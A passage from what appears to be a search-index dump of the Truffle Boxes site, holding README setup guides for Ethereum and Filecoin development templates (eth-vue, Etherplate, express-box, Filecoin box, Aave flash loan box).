directory:\\n\\n```\\ntruffle develop\\n```\\n\\nThen, in the Truffle developer console: \\n```\\ncompile\\n```\\n\\nand then:\\n```\\nmigrate\\n```\\n\\nTo test your smart contract(s), in truffle\\'s developer console:\\n```\\ntest\\n```\\n\\nNow that you have successfully launched your Solidity contract onto your local blockchain, go into the client directory:\\n\\n```\\ncd client\\n```\\n\\nRun the project by entering the following:\\n\\n```\\nnpm start\\n```\\n\\nTo see your project in the browser, go to http://localhost:3000/\\n\\nYou can test your DApp by entering the following:\\n\\n```\\nnpm test\\n```\\n\\n## Troubleshooting ##\\n\\nYou may need to install Xcode to use this box on macOS, see [node-gyp](https://github.com/nodejs/node-gyp) on Github. \\nThe following command may be useful if you encounter issues with this: ```xcode-select\\xe2\\x80\\x8a--install```.\\n'","title":"Index"},{"location":"boxes/eth-vue/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS eth-vue CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'[![Made in Nigeria](https://img.shields.io/badge/made%20in-nigeria-008751.svg?style=flat-square)](https://github.com/acekyd/made-in-nigeria)\\n## eth-vue Truffle Box: With Ganache Blockchain Option, Ropsten Network Configuration, and Gravatar access\\n \\n![eth-vue](https://raw.githubusercontent.com/DOkwufulueze/eth-vue/master/box-img-lg.png)\\n\\nThis Truffle Box provides everything you need to quickly build Ethereum dApps that have authentication features with [Vue 3](https://github.com/vuejs/vue-next), including configuration for easy deployment to the Ropsten Network. It\\'s also Gravatar-enabled. Connecting to a running [Ganache](https://github.com/trufflesuite/ganache) blockchain network from Truffle is also possible -- for fast development and testing purposes. \\nBuilt on [Truffle 5](https://github.com/trufflesuite/truffle/releases), [eth-vue](https://github.com/DOkwufulueze/eth-vue) uses [vuex](https://github.com/vuejs/vuex) for state management, [vuex-persist](https://github.com/championswimmer/vuex-persist) for local storage of app state, and [vue-router](https://github.com/vuejs/vue-router) for routing.\\nAuthentication functionalities are handled by Smart Contracts running on the Ethereum blockchain.\\n\\nWith deployment configuration for the Ropsten Network, deployment to the remote test network doesn\\'t have to be a pain anymore. It\\'s now as simple as `truffle migrate --network ropsten`\\n\\nIf you have a running Ganache blockchain network, configuring with [eth-vue](https://github.com/DOkwufulueze/eth-vue) will connect you immediately to the private blockchain. Visit the [Ganache](https://github.com/trufflesuite/ganache) page for installation and startup instructions, install Ganache, and [eth-vue](https://github.com/DOkwufulueze/eth-vue) will connect accordingly.\\n\\nSimply unbox and start building your own dApp.\\n\\n## Installation\\n- Install Truffle\\n\\n yarn global add truffle\\n\\n \\n\\n###### NOTE: If unboxing DOkwufulueze/eth-vue had failed previously due to absence of node-gyp, simply run `yarn global add node-gyp`. Or if it failed due to a problem with an existing node-gyp, run `node-gyp rebuild`. Else ignore this note and move on to the next instruction\\n\\n \\n\\n- Enter your development directory [eg. cd into a newly created `eth-vue` directory] and unbox `DOkwufulueze/eth-vue`\\n\\n truffle unbox DOkwufulueze/eth-vue\\n Or clone this repository from GitHub and `cd` into the `eth-vue` directory:\\n\\n git clone https://github.com/DOkwufulueze/eth-vue.git\\n\\n \\n\\n- Configure your environment\\n - Open the `truffle.js` file. You\\'ll find the following:\\n\\n ...\\n module.exports = {\\n ...\\n networks: {\\n development: {\\n host: \"localhost\",\\n port: 8545, // This is the conventional port. If you\\'re using the Ganache Blockchain, change port value to the Ganache default port 7545. If you\\'re using Truffle develop network, change port value to 9545\\n network_id: \"*\", // Match any network id. You may need to replace * with your network Id\\n from: \"\", // Add your unlocked account within the double quotes\\n gas: 4444444\\n }\\n }\\n };\\n Insert your unlocked account within the double-quotes of the `from` key\\n\\n - Open the `src/util/constants.js` file. You\\'ll find the following:\\n\\n export const NETWORKS = {\\n \\'1\\': \\'Main Net\\',\\n \\'2\\': \\'Deprecated Morden test network\\',\\n \\'3\\': \\'Ropsten test network\\',\\n \\'4\\': \\'Rinkeby test network\\',\\n \\'42\\': \\'Kovan test network\\',\\n \\'4447\\': \\'Truffle Develop Network\\',\\n \\'5777\\': \\'Ganache Blockchain\\',\\n \\'666\\': \\'Daniel Private Blockchain\\' // This is a test private blockchain. You can change it to your own private blockchain if you have one.\\n };\\n\\n export const APPROVED_NETWORK_ID = \"3\"; // Default is Ropsten. Set as you choose\\n ...\\n\\n The default network above is the Ropsten network [`APPROVED_NETWORK_ID = \\'3\\'`], but you can change this, as Ropsten was chosen for testing purpose only. \\n If your choice network is on the list of `NETWORKS` but is not Ropsten, then change the value of `APPROVED_NETWORK_ID` to the ID of your choice network. For example, if one is to use the private Blockchain above [`\\'666\\': \\'Daniel Private Blockchain\\'`], then `APPROVED_NETWORK_ID` would be `\\'666\\'`. \\n But if your choice network is not on the `NETWORKS` list, simply add your network using the existing pattern [` : `], and change the value of `APPROVED_NETWORK_ID` to the ID of your choice network. \\n If you\\'re using Ganache, please remember to point your Ethereum provider [Metamask, for example] to a Custom RPC running on port 7545. \\n For Truffle develop network, point your Ethereum provider [Metamask, for example] to a Custom RPC running on port 9545.\\n \\n\\n- Install dependencies if necessary.\\n\\n ###### NOTE: If you unboxed this boilerplate from Truffle [`truffle unbox DOkwufulueze/eth-vue`], then running `yarn install` is not necessary since unboxing installs dependencies by default. But if you cloned this boilerplate from GitHub [`git clone https://github.com/DOkwufulueze/eth-vue.git`], please run `yarn install` as stated below\\n\\n yarn install\\n \\n\\n## Compilation and Migration\\nTo deploy the contracts, you can either compile and migrate to your custom network as configured in the `truffle.js` file or you could use the test network and test addresses that truffle 4 provides. Find details for both deployment processes below.\\n\\n### Compile and Migrate to your custom network as configured in `truffle.js`. [For the [Ganache](https://github.com/trufflesuite/ganache) Blockchain, it runs on port 7545 and doesn\\'t conflict with any conventional port. So edit your `truffle.js` file appropriately before deploying]\\n\\n- Compile the Contracts [remember to add the `--network ropsten` option if you didn\\'t change the `APPROVED_NETWORK_ID` in `src/util/constants.js` from the default `3` to another id]\\n\\n truffle compile\\n \\n\\n- Deploy the compiled contracts [remember to add the `--network ropsten` option if you didn\\'t change the `APPROVED_NETWORK_ID` in `src/util/constants.js` from the default `3` to another id]\\n\\n truffle migrate\\n \\n\\n### Compile and Migrate to the Ropsten test network [this is very straightforward]\\n\\n- Compile the Contracts on Ropsten\\n\\n truffle compile --network ropsten\\n \\n\\n- Deploy the compiled Contracts to Ropsten\\n\\n truffle migrate --network ropsten\\n \\n\\n### Compile and Migrate using the `truffle develop` environment\\n \\n\\nThe default port for `truffle develop` is 9545, so it doesn\\'t conflict with any conventional port. Edit `truffle.js` appropriately.\\n- Enter the `truffle develop` environment\\n\\n truffle develop\\n \\n\\n- Compile the Contracts\\n\\n compile\\n \\n\\n- Deploy the compiled contracts\\n\\n migrate\\n \\n\\n## Launch the dApp\\n- Start the server\\n\\n yarn start\\n \\n\\n- The `eth-vue` DApp should now be running on http://localhost:3001 as you can see from your browser.\\n\\n## And that\\'s it, you\\'re DONE!\\n\\n \\n### Please send bug issues you may encounter to [Issues](https://github.com/DOkwufulueze/eth-vue/issues)\\n \\n## Copyleft\\n![Copyleft](https://raw.githubusercontent.com/DOkwufulueze/eth-vue/master/static/images/copyleft.png) 2017 Daniel Okwufulueze\\n \\n## Licence\\nThis dApp is distributed under the [GNU GPL-3.0](https://github.com/DOkwufulueze/eth-vue/blob/master/LICENCE.md) licence.\\n'","title":"Index"},{"location":"boxes/etherplate/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS etherplate CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"# Etherplate\\n\\n![etherplate red block logo](https://raw.githubusercontent.com/chuckbergeron/etherplate/master/app/images/logos/etherplate-logo--red--lg.png)\\n\\n[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com) [![CC0](https://img.shields.io/badge/license-CC0-green.svg)](https://creativecommons.org/publicdomain/zero/1.0/)\\n\\n### What is this?\\n\\nThis is an example project showing how you can hook up your Ethereum Non-Fungible Tokens (NFTs, ERC721, similar to CryptoKitties) contract in a DApp. It demos web3 events, and is highly opinionated in that it uses Redux, React, React Router, and Bulma. You can rip out of any these or replace them with your favourites (ie. Skeleton.css instead of Bulma, etc.).\\n\\nEtherplate uses OpenZeppelin's fantastic community-audited contracts as a base to implement the ERC721 standard.\\n\\n### View Demo\\n\\n[View Demo on Netlify (Uses Ropsten testnet)](http://etherplate.netlify.com/)\\n\\n![Etherplate Demo Gif](https://raw.githubusercontent.com/chuckbergeron/etherplate/master/app/images/etherplate-demo.gif)\\n\\n# Setup\\n\\n### Requires NPM & Direnv\\n\\nHomebrew on Mac OSX:\\n\\n`brew install node npm direnv`\\n\\nApt on Linux:\\n\\n`apt-get install node npm direnv`\\n\\n### Install truffle globally:\\n\\n`npm install truffle -g`\\n\\n### Install the local NPM packages:\\n\\n`npm install`\\n\\n### Environment Variables\\n\\n1. `cp .envrc.example .envrc`\\n\\n2. Enter your own twelve random words in the .envrc.\\n\\n3. Also, we'll leverage Infura's Ethereum Ropsten testnet node, so make sure to set up an account and paste your private key in your .envrc.\\n\\n4. Use `direnv allow` to export the env vars into your current terminal shell.\\n\\n### Run the Ganache CLI (local EVM)\\n\\nStart up the local Ethereum test node with:\\n\\n`npm run ganache`\\n\\n(You may need to loosen up the permissions on the file, try `chmod 755 scripts/ganache.sh`)\\n\\n### Compile the Solidity code\\n\\nOnce Ganache is running, in another terminal window compile and migrate the contracts:\\n\\n`truffle compile`\\n\\nThis will deploy the compiled contracts to the network (tip: use --network=ropsten to deploy to Ethereum's Ropsten Testnet, --network=rinkeby for rinkeby, etc)\\n\\n`truffle migrate`\\n\\n# Run the Project\\n\\nMake sure the truffle contracts are compiled and migrated, and ganache is running.\\n\\nStart the Webpack dev server.\\n\\n`npm run dev`\\n\\nYour server should now be running at http://127.0.0.1:8080\\n\\n### truffle.js & truffle-config.js\\n\\nWhy is there both a truffle and truffle-config file?\\n\\n* On Windows, truffle-config.js is required. You can safely delete the one you don't need (ie on Mac/Linux you can delete truffle-config.js)\\n\\n# Building the Project\\n\\n`npm run build`\\n\\n*Note: Currently we are manually migrating contracts against the Ropsten & Rinkeby testnets, and checking the build into the repo. This is less than ideal. It would be better to use a build script such as the [netlify-build.sh](https://github.com/chuckbergeron/etherplate/blob/master/netlify-build.sh) file and compile contracts on the server.*\\n\\n# Running the Tests\\n\\nFor the Solidity contract's truffle test suite:\\n\\n`truffle test`\\n\\nTo run the DApp test suite (React components, etc):\\n\\n`npm test`\\n\\n--------------------\\n\\n## Toast Messages\\n\\nExamples of a bunch of different looking toast messages to show on an error message, success, info, etc.:\\n\\n```\\n toastr.light('test', 'message', { icon: 'info', status: 'info' })\\n toastr.light('test', 'message', { icon: 'success', status: 'success' })\\n toastr.light('test', 'message', { icon: 'warning', status: 'warning' })\\n\\n toastr.success('test', 'message')\\n toastr.info('test', 'message')\\n toastr.warning('test', 'message')\\n toastr.error('test', 'message')\\n```\\n\\n## TODO:\\n\\n* Test w/ Web3-integrated browsers such as Trust\\n* Set up a basic server to respond to tokenURI requests and store the tokenURI in the contract (`buyToken()` function)\\n* Refactor React components to have both presentation and container components\\n* Add deepFreeze() to test immutability of Redux reducers\\n* Fix issues where we should be unsubscribing / canceling server requests in `componentWillUnmount()`\\n* Rename all services to have `-service` in the filename\\n* Rename all components to use standard React naming scheme: `EtherscanButton.jsx` instead of `etherscan-button.jsx`\\n* Follow a standard ES6 export pattern (use TokenListItem component code as an example)\\n\\n## Nice-to-haves:\\n\\n* Offline.js or react-detect-offline to let users know when their network connection is dead\\n* Find a way to prevent `truffle test` from recompiling the contracts each time it is run\\n* Store transactionHash in localStorage and call info on it after page refreshes if it isn't in `store.getState().tokens` pool\\n* Remove the build directory from the repo, build server-side on each deploy and possibly use truffle-migrate-off-chain (https://github.com/asselstine/truffle-migrate-off-chain)\\n* Test the happy path of filling out the form and purchasing a token via (jest/enzyme)\\n* Get `circleci` branch up and running, put a badge on the README for test runs\\n* Demo how ERC721 expects you to store data (such as the JSON response when the tokenURI is requested) as per https://eips.ethereum.org/EIPS/eip-721 (For instance, OpenSea has a server which takes a contract address and tokenID, which then does a GET request to the tokenURI to pull more info (as JSON) about the token (images, name, etc), for example: https://opensea-api.herokuapp.com/events/?asset_contract_address=0x06012c8cf97bead5deae237070f9587f8e7a266d&token_id=389343)\\n\\n\\n## Done:\\n\\n* ~~Make into a truffle box and submit to trufflesuite~~\\n* ~~BUG: Purchase History only showing some purchases while My Tokens shows more ... ?~~\\n* ~~Show token ID / transaction ID on purchase history and Tokens#show page~~\\n* ~~Make sure 'Purchase History' page works~~\\n* ~~Implement Redux for web3 events~~\\n* ~~Make all React prop types required (isRequired) and provide defaultProps for those that are not~~\\n* ~~Convert all css to scss~~\\n* ~~Improve mobile styling / media query support~~\\n* ~~Deploy to Netlify & Ropsten, use Infura~~\\n* ~~Use a local web3 (1.0.0.beta?) instead of the current MetaMask/browser's web3 instance (which is deprecated)~~\\n* ~~Fix getting duplicate entries when Ropsten returns the BoughtToken event (active subscriber listening for events in browser)~~\\n* ~~New token updated from transaction receipt event is not being added to state properly in realtime~~\\n* ~~Get DApp tests working again~~\\n* ~~On successful purchase, show a message about the new purchase and how it needs to be confirmed by the network, and redirect to show the now confirming token on Purchase History or My Tokens page~~\\n* ~~Instead of 'Loading ...' should say confirming (show # of confirmations?)~~\\n* ~~Race condition: sometimes we do not have the list of accounts from MetaMask on time when page loads (google for onPageLoad code)~~\\n* ~~Mock out a web3 object in the specs~~\\n* ~~Clean up JS in Header.jsx for controlling Bulma link active states~~\\n* ~~Show account balance, network and account address / avatar~~\\n* ~~Finish upgrade path by removing `oldNfTokenFactory` and in turn get `.events.BoughtToken()` working again: (Error: The current provider doesn't support subscriptions: MetamaskInpageProvider)~~\\n* ~~Add a price for each token (say 0.03 eth)~~\\n* ~~Toast message to say token purchase was broadcast~~\\n* ~~Link to view on on etherscan~~\\n* ~~If the user switches their MetaMask account or logs out of MetaMask, need to refresh the page or stop/restart event listeners with new wallet address (Long Polling?)~~\\n\\n#### Gratitude\\n\\nBig thanks to all of the fantastic open source developers who have made this technology actual, and to [Brendan Asselstine](https://medium.com/@asselstine) for helping kickstart my development with blockchain technologies.\\n\\n#### Etherplate Wordmark\\n\\nThe Etherplate Wordmark is set in Sign Painter: https://typekit.com/fonts/signpainter\\n\"","title":"Index"},{"location":"boxes/express-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS express-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"# Express-Box\\nTo Be Used as Truffle Box Creating API Endpoints for\\nEthereum Blockchain.\\n\\nWe use personalised blockchain for Ethereum BlockChain\\nDevelopment. This personalised blockchain is made in the\\nGanacheCLI.\\n\\nThe Smart Contract Written in solidity language\\nis deployed on this Ethereum Blockchain. Smart Contract is\\nImmutable hence, once deployed it can't be changed.\\n\\nA truffle box to serve as the foundation of any Truffle and Express.js dApp.\\n\\nThis Box Uses NodeJS(Express JS) to provide API\\nendpoints to the Ethereum Blockchain smart contract so that this\\nsmart contract can be used in Android Apps as well.\\n\\n**Pre-Requisites**\\n1. [NodeJS](https://www.digitalocean.com/community/tutorials/how-to-install-node-js-on-ubuntu-16-04)\\n2. [Yarn](https://stackoverflow.com/questions/42606941/install-yarn-ubuntu-16-04-linux-mint-18-1)\\n3. [GanacheCLI](https://github.com/trufflesuite/ganache-cli)\\n4. [Truffle](https://github.com/trufflesuite/truffle)\\n\\n**Installation**\\n1. Install Truffle and Ganache CLI globally. If you prefer, the graphical version of Ganache works as well!\\n```\\nnpm install -g truffle\\nnpm install -g ganache-cli\\n```\\n\\n2. Download the box. This also takes care of installing the necessary dependencies.\\n\\n```\\ntruffle unbox arvindkalra/express-box\\n\\n```\\n\\n3. Install all the node modules required by running:\\n```javascript\\n// install all the node modules using npm\\nnpm install\\n``` \\nor if you prefer yarn\\n```javascript\\n//install all the node modules using yarn\\nyarn install\\n```\\n4. Start truffle development console using\\n```\\ntruffle develop\\n```\\n5. Inside the truffle console run `compile` to compile the contracts\\n6. You can see that a new `/build` folder has been created in the root directory which contains the compiled contracts.\\n\\n7. Now these contracts need to be deployed on the Blockchain. For this, run `migrate` inside the truffle development console\\n\\n\\n8. To run the Express server `yarn start` or `npm start`\\n9. In the browser window open `http://localhost:3000/`.\\n\\n**Collaborators**\\n1. [ARVIND KALRA](https://github.com/arvindkalra)\\n2. [PRANAV SINGHAL](https://github.com/pranav-singhal)\\n\"","title":"Index"},{"location":"boxes/filecoin/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS filecoin-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'# Filecoin Box\\n\\n![box-artwork](https://github.com/truffle-box/filecoin-box/blob/master/box-img-sm.png?raw=true)\\n\\nWelcome to the Filecoin box. The goal of this box is to both get you hands-on with all the official Filecoin support available within Truffle and Ganache, and to kick-start your journey into the Filecoin ecosystem and the benefits that robust decentralized storage can bring to your DApps.\\n\\nThe context of the box is that of a decentralized art gallery. It comprises both [Lotus](https://docs.filecoin.io/reference/lotus-api/) and [IPFS](https://ipfs.io/) nodes (simulating the process of creating a storage deal), an Ethereum node (for the deployment of the [ERC-721](https://docs.openzeppelin.com/contracts/3.x/) based NFT contracts) and a [front-end](#gallery-ui) for viewing the gallery and the assets decentrally stored within.\\n\\n## Requirements\\n\\nThe Filecoin box has the following requirements:\\n\\n- [Node.js](https://nodejs.org/) 12.x or later\\n- [NPM](https://docs.npmjs.com/cli/) version 5.2 or later\\n- Windows, Linux or MacOS\\n\\n## Installation\\n\\n```bash\\n$ truffle unbox filecoin\\n$ npm install\\n```\\n\\n## Setup\\n\\n### Running Filecoin Ganache\\n\\nOnce installed, you can run Filecoin Ganache with the following command:\\n\\n```bash\\n$ npx ganache filecoin\\n```\\n\\nThis creates 10 accounts, each loaded with 100 [FIL](https://docs.filecoin.io/reference/#wallets), and displays both their account addresses and associated private keys.\\n\\n```bash\\nAvailable Accounts\\n==================\\n(0) t3rvcqmc5otc3sh3cngqg2ttzcu7ezpco466lbafzaoygxvnzsw7e7n2zbjwhiv5fdzhs6uxm2qckwt6lp5wga (100 FIL)\\n(1) t3s3la37547tijmoeiep7ktogws3tep2eqrralh7rhi2mpe46q574gceyy467356onblzvwf7ejlelo2rdsg4q (100 FIL)\\n(2) t3wk7a46e2dcqb7qxeuz2zq7wodwycdgtbgdpr37hhvelfilf5yvssg5xbsolgusqsumomtmtqhnobh4carhyq (100 FIL)\\n...\\n```\\n\\nIt also starts the Lotus and IPFS daemons running over `http` and `ws` respectively:\\n\\n```bash\\nLotus RPC listening on 127.0.0.1:7777\\nIPFS RPC listening on 127.0.0.1:5001\\n```\\n\\n### Optionally running the Filecoin Ganache GUI\\n\\nAn alternative to running Filecoin Ganache via the CLI is to use Filecoin Ganche UI. As per the screenshot below, this exposes all the core Filecoin protocol elements as tabs which is particularly useful if you\\'re just starting out.\\n\\n![filecoin-ganache-ui](https://github.com/truffle-box/filecoin-box/blob/master/screenshots/filecoin-ganache-ui.png?raw=true)\\n\\nFilecoin Ganche UI can be downloaded [here](https://github.com/trufflesuite/ganache/releases/tag/v2.6.0-beta.3). \\n\\n### Running the Filecoin Network Explorer\\n\\n> Note that these steps will be changing (merging branch into master / main, webpack, truffle plugin, etc).\\n\\n```bash\\n$ git clone https://github.com/trufflesuite/filecoin-network-inspector\\n$ npm install\\n$ git checkout ganache-changes\\n$ npm run start\\n```\\n\\nAssuming it\\'s running correctly, you can open the Filecoin Network Explorer at the following: http://localhost:3000\\n\\n### Running Ethereum Ganache\\n\\n```bash\\n$ npx ganache ethereum\\n```\\n\\n```bash\\nRPC Listening on 127.0.0.1:8545\\n```\\n\\n## Creating Storage Deals\\n\\nA [storage deal](https://docs.filecoin.io/store/lotus/store-data/#find-a-miner) is an agreement between a client and a storage miner to store some data in the network for a given duration. Note that while in the case of Filecoin\\'s mainnet, a deal must be secured with a miner before data is stored, in Filecoin Ganache a deal is reached automatically.\\n\\n### Via the Filecoin Network Explorer\\n\\nThe simplest way to store data, open the Filecoin Network Explorer and navigate to the \"Market\" tab. From here you can select a file by clicking \"Choose File\" followed by \"Upload to the Filecoin Network\".\\n\\n### Via Truffle Preserve\\n\\n[Truffle](https://www.trufflesuite.com/docs/truffle/overview) now has a `preserve` command which allows for the \\'preservation\\' of files directly from the Truffle CLI. This is currently experimental and thus on specific branch; installation details available at [here](https://www.trufflesuite.com/blog/announcing-collaboration-with-filecoin).\\n\\nOnce installed, you\\'ll be able to preserve your assets via the following command. Note that you\\'ll need to include the `environments` object in your `truffle-config.js` to point at the respective node (although these are already preconfigured in the box).\\n\\n```\\n$ truffle preserve --environment development ./assets/ --filecoin\\n```\\n\\nFor broader help with this command run `truffle help preserve`.\\n\\n### Via Curl (or equivalent)\\n\\nLastly, you can send the following `curl` request directly to the Lotus RPC. Note that the you\\'ll need to update both the wallet address (`t3s3la3754...`) and CID (`QmZTR5bcpQ...`).\\n\\n```bash\\ncurl -X POST \\\\\\n -H \\'Content-Type: application/json\\' \\\\\\n -d \\'{\"jsonrpc\":\"2.0\",\"id\":0,\"method\":\"Filecoin.ClientStartDeal\",\"params\":[{\"Data\":{\"TransferType\":\"graphsync\",\"Root\":{\"/\":\"QmZTR5bcpQD7cFgTorqxZDYaew1Wqgfbd2ud9QqGPAkK2V\"},\"PieceCid\":null,\"PieceSize\":0},\"Wallet\":\"t3s3la37547tijmoeiep7ktogws3tep2eqrralh7rhi2mpe46q574gceyy467356onblzvwf7ejlelo2rdsg4q\",\"Miner\":\"t01000\",\"EpochPrice\":\"2500\",\"MinBlocksDuration\":300}]}\\' \\\\\\n http://localhost:7777/rpc/v0\\n```\\n\\n## Minting an NFT\\n\\nIn the example below, we\\'ve already created a deal for the 3 assets (metadata, thumbnail, and the original asset respectively) that comprise our NFT. These are as follows, with their corresponding CIDs.\\n\\n- metadata ([QmS4t7rFPxaaNriXvCmALr5GYRAtya5urrDaZgkfHutdCG](https://ipfs.io/ipfs/QmS4t7rFPxaaNriXvCmALr5GYRAtya5urrDaZgkfHutdCG))\\n- thumbnail - ([QmbAAMaGWpiSgmMWYTRtGsru382j6qTVQ4FDKX2cRTRso6](https://ipfs.io/ipfs/QmbAAMaGWpiSgmMWYTRtGsru382j6qTVQ4FDKX2cRTRso6))\\n- asset - ([QmUWFZQrJHfCVNHXVjjb2zeowVvH7dC6rKpbdHsTdnAgvP](https://ipfs.io/ipfs/QmUWFZQrJHfCVNHXVjjb2zeowVvH7dC6rKpbdHsTdnAgvP))\\n\\nAssuming the local Ethereum Ganache node is running, you\\'ll be able to open a console and mint a new NFT with the following steps. As the base URL is set to that of an IPFS gateway, we\\'ll just need to pass in the CID to the asset metadata.\\n\\n```bash\\n$ truffle console\\ntruffle(development)> const gallery = await MyGallery.deployed()\\ntruffle(development)> gallery.mint(accounts[0], \"QmS4t7rFPxaaNriXvCmALr5GYRAtya5urrDaZgkfHutdCG\")\\n```\\n\\nIn the above example the owner of the NFT is set (via `accounts[0]`) to that of the first account generated by the mnemonic. If we want to transfer it to a new owner, we\\'ll be able to do so with the following.\\n\\n### Transferring Ownership\\n\\n```bash\\n$ truffle console\\ntruffle(development)> gallery.transferFrom(accounts[0], accounts[1], 1)\\n```\\n\\n## Gallery UI\\n\\nA sample gallery interface is available [here](https://truffle-box.github.io/filecoin-box/).\\n\\n![sample-ui](https://github.com/truffle-box/filecoin-box/blob/master/screenshots/sample-ui.png?raw=true)\\n\\nYou can use the following steps to run this locally...\\n\\n```\\n$ cd ui\\n$ npm install\\n$ npm run start\\n```\\n\\n## Support\\n\\nSupport for this box is available via the Truffle community available [here](https://www.trufflesuite.com/community). In addition, Filecoin support is available [here](https://filecoin.io/).'","title":"Index"},{"location":"boxes/flashloan-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS flashloan-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"# Aave Flash Loan Truffle Box\\n\\nThis Truffle box comes with everything you need to start [developing on flash loans](https://docs.aave.com/developers/tutorials/performing-a-flash-loan/...-with-truffle)\\n\\n## Installation and Setup\\n\\n0. Install Truffle globally, if not already installed.\\n ```\\n npm install -g truffle@latest\\n ```\\n Note: there is an issue with some older Truffle versions, e.g. v.5.1.25.\\n **This truffle box is confirmed working with the latest version (Truffle v5.1.32)**\\n1. Download the box.\\n ```\\n truffle unbox aave/flashloan-box\\n ```\\n2. Rename the `env` file to `.env` and edit the following values in the file:\\n - Sign up for [Infura](https://infura.io/) (or a similar provider) and replace `YOUR_INFURA_KEY` with an API key for your project (this is called Project ID in the Infra dashboard).\\n - Replace `YOUR_ACCOUNT_KEY_FOR_DEPLOYMENT` with the private key of the ethereum account you will be using to deploy the contracts. This account will become the `owner` of the contract.\\n3. Ensure your ethereum account has some ETH to deploy the contract.\\n4. In your terminal, navigate to your repo directory and install the dependencies (if not already done):\\n ```\\n npm install\\n ```\\n5. In the same terminal, replace `NAME_OF_YOUR_NETWORK` with either `kovan`, `ropsten`, or `mainnet` (depending on where you want to deploy the contract):\\n ```\\n truffle console --network NAME_OF_YOUR_NETWORK\\n ```\\n6. You are now connected to the network you chose. In the same terminal window:\\n ```\\n migrate --reset\\n ```\\n7. After a few minutes, your contract will be deployed on your chosen network.\\n - If you have not added any profitable logic to `Flashloan.sol` line 23, then you will need to fund your contract with the desired asset.\\n - See our [documentation](https://docs.aave.com/developers/developing-on-aave/deployed-contract-instances#reserves-assets) for token address and faucets.\\n8. Call your contract's flashloan function within the truffle console, replacing `RESERVE_ADDRESS` with the [reserve address](https://docs.aave.com/developers/developing-on-aave/deployed-contract-instances#reserves-assets) found in our documentation:\\n ```\\n let f = await Flashloan.deployed()\\n await f.flashloan(RESERVE_ADDRESS)\\n ```\\n - if the above operation takes an unreasonably long time or timesout, try `CTRL+C` to exit the Truffle console, repeat step 5, then try this step agin. You may need to wait a few blocks before your node can 'see' the deployed contract.\\n9. If you've successfully followed the above steps, then congratulations, you've just made a flash loan.\\n - For reference, here is an [example transaction](https://ropsten.etherscan.io/tx/0x7877238373ffface4fb2b98ca4db1679c64bc2c84c7754432aaab994a9b51e17) that followed the above steps on `Ropsten` using **Dai**.\\n - For reference, here is an [example transaction](https://ropsten.etherscan.io/tx/0x32eb3e03e00803dc19a7d2edd0a0a670756fbe210be81697be312518baeb16cc) that followed the above steps on `Ropsten` using **ETH**.\\n\\n## Setup for cross protocol flash lending\\nIf you are working across protocols, such as using the flash loaned amount on another #DeFi protocol, sometimes it is easier to fork mainnet and use each protocol's production contracts and production ERC20 tokens.\\n\\n1. Follow the steps 0 --> step 4 from above.\\n2. (Install and) Run [Ganache](https://www.trufflesuite.com/ganache), preferably the [CLI version](https://github.com/trufflesuite/ganache-cli)\\n3. In `truffle-config.js`, ensure the details for the `development` network match up with your running Ganache instance.\\n4. To minimise set up steps with Aave's lending pools, use Ganache's fork feature. This will 'fork' mainnet into your Ganache instance.\\n Open terminal, replace `YOUR_INFURA_KEY` (this is called Project ID in the Infra dashboard) in the following and run:\\n ```\\n ganache-cli --fork https://mainnet.infura.io/v3/YOUR_INFURA_KEY -i 1\\n ```\\n5. In a new terminal window in your repo directory, run:\\n ```\\n truffle console\\n ```\\n6. Migrate your Flashloan contract to your instance of Ganache with:\\n ```\\n migrate --reset\\n ```\\n7. After a few minutes, your contract will be deployed.\\n - If you have not added any profitable logic to `Flashloan.sol` line 23, then you will need to fund your contract with the desired asset.\\n - See our [documentation](https://docs.aave.com/developers/developing-on-aave/deployed-contract-instances#reserves-assets) for token address and faucets.\\n8. Your contract is now deployed on your local Ganache, which is mirroring mainnet. Call your contract's flashloan function within the truffle console, replacing `RESERVE_ADDRESS` with the [reserve address](https://docs.aave.com/developers/developing-on-aave/deployed-contract-instances#reserves-assets) found in our documentation:\\n ```\\n let f = await Flashloan.deployed()\\n await f.flashloan(RESERVE_ADDRESS)\\n ```\\n Be patient as your ganache instance works its magic.\\n\\n9. If your implementation is correct, then the transaction will succeed. If it fails/reverts, a reason will be given.\\n\\n## Known issues\\n### No access to archive state errors\\nIf you are using Ganache to fork a network, then you may have issues with the blockchain archive state every 30 minutes. This is due to your node provider (i.e. Infura) only allowing free users access to 30 minutes of archive state. To solve this, upgrade to a paid plan, or simply restart your ganache instance and redploy your contracts.\\n\\n### Unable to debug executeOperation() with mainnet ganache fork\\nThe Truffle debugger does not work too well with proxy / complex calls. You may find that the Truffle debugger returns an error such as:\\n```\\nTypeError: Cannot read property 'version' of undefined\\nat ...\\n```\\n- In this case you can try calling your `executeOperation()` function directly, instead of having Aave's `LendingPool` contract invoke the function. This will allow you to debug the function directly, however you will need to supply the relevant parameters (e.g. `_amount`, `_fee`, `_reserve`, etc).\\n- Alternatively, see the 